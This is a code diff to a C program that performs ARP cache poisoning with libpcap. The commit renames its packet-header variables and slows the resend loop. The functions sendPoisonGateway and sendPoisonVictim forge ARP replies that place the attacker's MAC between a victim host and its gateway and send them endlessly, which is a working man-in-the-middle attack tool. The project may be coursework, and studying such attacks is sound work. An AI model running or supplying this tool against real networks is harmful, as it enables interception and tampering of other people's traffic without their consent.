@@ -171,45 +171,45 @@ char* getGatewayIP(){
 
 void *sendPoisonGateway(void *data){
     unsigned char packet[100];
-    struct libnet_ethernet_hdr test;
-    arphdr_t test2;
+    struct libnet_ethernet_hdr etherhdr;
+    arphdr_t arphdr;
     struct thread_arg *arg=(struct thread_arg *)data;
 
     memset(packet, 0, sizeof(packet));
 
     for(int i=0; i<6; i++){
-        test.ether_dhost[i]=arg->gmac[i];
+        etherhdr.ether_dhost[i]=arg->gmac[i];
     }
 
     for(int i=0;i<6;i++){
-        test.ether_shost[i]=arg->mac[i];
+        etherhdr.ether_shost[i]=arg->mac[i];
     }
 
-    test.ether_type=htons(ETHERTYPE_ARP);
+    etherhdr.ether_type=htons(ETHERTYPE_ARP);
 
-    test2.htype=htons(1);
-    test2.ptype=htons(ETHERTYPE_IP);
-    test2.hlen=0x06;
-    test2.plen=0x04;
-    test2.oper=htons(ARP_REPLY);
+    arphdr.htype=htons(1);
+    arphdr.ptype=htons(ETHERTYPE_IP);
+    arphdr.hlen=0x06;
+    arphdr.plen=0x04;
+    arphdr.oper=htons(ARP_REPLY);
     for(int i=0;i<6;i++){
-        test2.sha[i]=arg->mac[i];
+        arphdr.sha[i]=arg->mac[i];
     }
-    inet_pton(AF_INET, arg->vip, test2.spa);
+    inet_pton(AF_INET, arg->vip, arphdr.spa);
     for(int i=0;i<6;i++){
-        test2.tha[i]=arg->gmac[i];
+        arphdr.tha[i]=arg->gmac[i];
     }
-    inet_pton(AF_INET, arg->gatewayip, test2.tpa);
+    inet_pton(AF_INET, arg->gatewayip, arphdr.tpa);
 
-    memcpy(packet, (void *)&test, sizeof(struct libnet_ethernet_hdr));
-    memcpy(packet+sizeof(struct libnet_ethernet_hdr), (void *)&test2, sizeof(arphdr_t));
+    memcpy(packet, (void *)&etherhdr, sizeof(struct libnet_ethernet_hdr));
+    memcpy(packet+sizeof(struct libnet_ethernet_hdr), (void *)&arphdr, sizeof(arphdr_t));
 
     while(1){
         if(pcap_sendpacket(arg->descr, packet, 60) != 0){
             fprintf(stderr,"\n Error sending the packet: %s\n", pcap_geterr(arg->descr));
             exit(-1);
         }
-        sleep(1);
+        sleep(3);
     }
 
     pthread_exit(0);
@@ -217,45 +217,45 @@ void *sendPoisonGateway(void *data){
 
 void *sendPoisonVictim(void *data){
     unsigned char packet[100];
-    struct libnet_ethernet_hdr test;
-    arphdr_t test2;
+    struct libnet_ethernet_hdr etherhdr;
+    arphdr_t arphdr;
     struct thread_arg *arg=(struct thread_arg *)data;
 
     memset(packet, 0, sizeof(packet));
 
     for(int i=0; i<6; i++){
-        test.ether_dhost[i]=arg->vmac[i];
+        etherhdr.ether_dhost[i]=arg->vmac[i];
     }
 
     for(int i=0;i<6;i++){
-        test.ether_shost[i]=arg->mac[i];
+        etherhdr.ether_shost[i]=arg->mac[i];
     }
 
-    test.ether_type=htons(ETHERTYPE_ARP);
+    etherhdr.ether_type=htons(ETHERTYPE_ARP);
 
-    test2.htype=htons(1);
-    test2.ptype=htons(ETHERTYPE_IP);
-    test2.hlen=0x06;
-    test2.plen=0x04;
-    test2.oper=htons(ARP_REPLY);
+    arphdr.htype=htons(1);
+    arphdr.ptype=htons(ETHERTYPE_IP);
+    arphdr.hlen=0x06;
+    arphdr.plen=0x04;
+    arphdr.oper=htons(ARP_REPLY);
     for(int i=0;i<6;i++){
-        test2.sha[i]=arg->mac[i];
+        arphdr.sha[i]=arg->mac[i];
     }
-    inet_pton(AF_INET, arg->gatewayip, test2.spa);
+    inet_pton(AF_INET, arg->gatewayip, arphdr.spa);
     for(int i=0;i<6;i++){
-        test2.tha[i]=arg->vmac[i];
+        arphdr.tha[i]=arg->vmac[i];
     }
-    inet_pton(AF_INET, arg->vip, test2.tpa);
+    inet_pton(AF_INET, arg->vip, arphdr.tpa);
 
-    memcpy(packet, (void *)&test, sizeof(struct libnet_ethernet_hdr));
-    memcpy(packet+sizeof(struct libnet_ethernet_hdr), (void *)&test2, sizeof(arphdr_t));
+    memcpy(packet, (void *)&etherhdr, sizeof(struct libnet_ethernet_hdr));
+    memcpy(packet+sizeof(struct libnet_ethernet_hdr), (void *)&arphdr, sizeof(arphdr_t));
 
     while(1){
         if(pcap_sendpacket(arg->descr, packet, 60) != 0){
             fprintf(stderr,"\n Error sending the packet: %s\n", pcap_geterr(arg->descr));
             exit(-1);
         }
-        sleep(1);
+        sleep(3);
     }
 
     pthread_exit(0);
@@ -274,8 +274,8 @@ int main(int argc, char *argv[])
     char ip[20];
     u_char mac[20];
 
-    struct libnet_ethernet_hdr test;
-    arphdr_t test2;
+    struct libnet_ethernet_hdr etherhdr;
+    arphdr_t arphdr;
 
     struct pcap_pkthdr* pkthdr;
     u_char* data;
@@ -314,31 +314,31 @@ int main(int argc, char *argv[])
     gatewayip=getGatewayIP();
 
     for(int i=0; i<6; i++){
-        test.ether_dhost[i]=0xFF;
+        etherhdr.ether_dhost[i]=0xFF;
     }
 
     for(int i=0;i<6;i++){
-        test.ether_shost[i]=mac[i];
+        etherhdr.ether_shost[i]=mac[i];
     }
 
-    test.ether_type=htons(ETHERTYPE_ARP);
+    etherhdr.ether_type=htons(ETHERTYPE_ARP);
 
-    test2.htype=htons(1);
-    test2.ptype=htons(ETHERTYPE_IP);
-    test2.hlen=0x06;
-    test2.plen=0x04;
-    test2.oper=htons(ARP_REQUEST);
+    arphdr.htype=htons(1);
+    arphdr.ptype=htons(ETHERTYPE_IP);
+    arphdr.hlen=0x06;
+    arphdr.plen=0x04;
+    arphdr.oper=htons(ARP_REQUEST);
     for(int i=0;i<6;i++){
-        test2.sha[i]=mac[i];
+        arphdr.sha[i]=mac[i];
     }
-    inet_pton(AF_INET, ip, test2.spa);
+    inet_pton(AF_INET, ip, arphdr.spa);
     for(int i=0;i<6;i++){
-        test2.tha[i]=0x00;
+        arphdr.tha[i]=0x00;
     }
-    inet_pton(AF_INET, argv[1], test2.tpa);
+    inet_pton(AF_INET, argv[1], arphdr.tpa);
 
-    memcpy(packet, (void *)&test, sizeof(struct libnet_ethernet_hdr));
-    memcpy(packet+sizeof(struct libnet_ethernet_hdr), (void *)&test2, sizeof(arphdr_t));
+    memcpy(packet, (void *)&etherhdr, sizeof(struct libnet_ethernet_hdr));
+    memcpy(packet+sizeof(struct libnet_ethernet_hdr), (void *)&arphdr, sizeof(arphdr_t));
 
     if(pcap_sendpacket(descr, packet, 42) != 0){
         fprintf(stderr,"\n Error sending the packet: %s\n", pcap_geterr(descr));
@@ -380,31 +380,31 @@ int main(int argc, char *argv[])
     //////////////////////////////////////////////////////
 
     for(int i=0; i<6; i++){
-        test.ether_dhost[i]=0xFF;
+        etherhdr.ether_dhost[i]=0xFF;
     }
 
     for(int i=0;i<6;i++){
-        test.ether_shost[i]=mac[i];
+        etherhdr.ether_shost[i]=mac[i];
     }
 
-    test.ether_type=htons(ETHERTYPE_ARP);
+    etherhdr.ether_type=htons(ETHERTYPE_ARP);
 
-    test2.htype=htons(1);
-    test2.ptype=htons(ETHERTYPE_IP);
-    test2.hlen=0x06;
-    test2.plen=0x04;
-    test2.oper=htons(ARP_REQUEST);
+    arphdr.htype=htons(1);
+    arphdr.ptype=htons(ETHERTYPE_IP);
+    arphdr.hlen=0x06;
+    arphdr.plen=0x04;
+    arphdr.oper=htons(ARP_REQUEST);
     for(int i=0;i<6;i++){
-        test2.sha[i]=mac[i];
+        arphdr.sha[i]=mac[i];
     }
-    inet_pton(AF_INET, ip, test2.spa);
+    inet_pton(AF_INET, ip, arphdr.spa);
     for(int i=0;i<6;i++){
-        test2.tha[i]=0x00;
+        arphdr.tha[i]=0x00;
     }
-    inet_pton(AF_INET, gatewayip, test2.tpa);
+    inet_pton(AF_INET, gatewayip, arphdr.tpa);
 
-    memcpy(packet, (void *)&test, sizeof(struct libnet_ethernet_hdr));
-    memcpy(packet+sizeof(struct libnet_ethernet_hdr), (void *)&test2, sizeof(arphdr_t));
+    memcpy(packet, (void *)&etherhdr, sizeof(struct libnet_ethernet_hdr));
+    memcpy(packet+sizeof(struct libnet_ethernet_hdr), (void *)&arphdr, sizeof(arphdr_t));
 
     if(pcap_sendpacket(descr, packet, 42) != 0){
         fprintf(stderr,"\n Error sending the packet: %s\n", pcap_geterr(descr));
